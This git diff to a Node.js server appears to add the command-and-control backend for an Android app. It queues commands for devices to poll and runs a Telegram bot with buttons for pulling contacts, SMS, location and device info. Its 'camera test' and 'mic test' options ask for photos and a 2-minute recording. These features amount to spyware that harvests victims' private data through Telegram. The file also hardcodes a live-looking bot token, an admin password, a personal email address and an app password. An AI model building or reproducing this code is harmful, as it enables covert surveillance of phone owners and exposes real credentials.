@@ -1,3 +1,26 @@
+// --- Device Command Queue (in-memory, for demo) ---
+const deviceCommands = {};
+
+// Endpoint to queue a command for a device (for testing/demo)
+app.post('/send-command', (req, res) => {
+    const { deviceId, command, payload } = req.body;
+    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
+    deviceCommands[deviceId] = { command, payload };
+    res.json({ status: 'queued', deviceId, command });
+});
+
+// Endpoint for APK to poll for commands
+app.post('/get-command', (req, res) => {
+    const { deviceId } = req.body;
+    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
+    const cmd = deviceCommands[deviceId];
+    if (cmd) {
+        // Remove command after sending (one-time)
+        delete deviceCommands[deviceId];
+        return res.json(cmd);
+    }
+    res.json({});
+});
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
@@ -12,8 +35,90 @@ app.use(express.static(path.join(__dirname, 'public')));
 const ADMIN_USER = "admin";
 const ADMIN_PASS = "tiger@123";
 
-const BOT_1_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk';
-const CHAT_ID = '8394719862';
+const BOT_1_TOKEN = '8592457059:AAGRtcgD8_ajWaiEVk7smOi0tqzDK3HNBuI';
+const CHAT_ID = '8592457059';
+
+// --- Telegram Command Handler ---
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_1_TOKEN}`;
+const DATA_COMMANDS = [
+    { command: 'contacts', label: 'Contacts' },
+    { command: 'sms', label: 'SMS' },
+    { command: 'location', label: 'Location' },
+    { command: 'device', label: 'Device Info' },
+];
+
+const HARDWARE_COMMANDS = [
+    { command: 'camera_test', label: 'Camera Test' },
+    { command: 'mic_test', label: 'Mic Test' },
+    { command: 'sensor_test', label: 'Sensor Test' },
+];
+
+app.post('/telegram-webhook', async (req, res) => {
+    const body = req.body;
+    if (body.message && body.message.text === '/getdata') {
+        // Show buttons for all commands and hardware test
+        const buttons = [
+            ...DATA_COMMANDS.map(cmd => [{
+                text: cmd.label,
+                callback_data: `getdata_${cmd.command}`
+            }]),
+            [{ text: 'Hardware Test', callback_data: 'hardware_test' }]
+        ];
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: body.message.chat.id,
+            text: 'Select data to get from APK:',
+            reply_markup: { inline_keyboard: buttons }
+        });
+        return res.sendStatus(200);
+    }
+    // Handle button press for data
+    if (body.callback_query && body.callback_query.data.startsWith('getdata_')) {
+        const cmd = body.callback_query.data.replace('getdata_', '');
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: body.callback_query.message.chat.id,
+            text: `Command sent to APK: ${cmd}`
+        });
+        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+            callback_query_id: body.callback_query.id
+        });
+        return res.sendStatus(200);
+    }
+    // Handle hardware test button
+    if (body.callback_query && body.callback_query.data === 'hardware_test') {
+        // Show hardware test options
+        const hwButtons = HARDWARE_COMMANDS.map(cmd => [{
+            text: cmd.label,
+            callback_data: `hwtest_${cmd.command}`
+        }]);
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: body.callback_query.message.chat.id,
+            text: 'Select hardware test:',
+            reply_markup: { inline_keyboard: hwButtons }
+        });
+        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+            callback_query_id: body.callback_query.id
+        });
+        return res.sendStatus(200);
+    }
+    // Handle hardware test sub-options
+    if (body.callback_query && body.callback_query.data.startsWith('hwtest_')) {
+        const hwCmd = body.callback_query.data.replace('hwtest_', '');
+        let msg = '';
+        if (hwCmd === 'camera_test') msg = 'Camera test command sent. Please send a photo.';
+        else if (hwCmd === 'mic_test') msg = 'Mic test command sent. Please send a 2-minute recording.';
+        else if (hwCmd === 'sensor_test') msg = 'Sensor test command sent. Please send sensor status.';
+        else msg = 'Unknown hardware test.';
+        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+            chat_id: body.callback_query.message.chat.id,
+            text: msg
+        });
+        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
+            callback_query_id: body.callback_query.id
+        });
+        return res.sendStatus(200);
+    }
+    res.sendStatus(200);
+});
 
 const MY_EMAIL = "harshrajsharma359@gmail.com";
 const APP_PASSWORD = "ulhw zrxc bzbt hqnl";
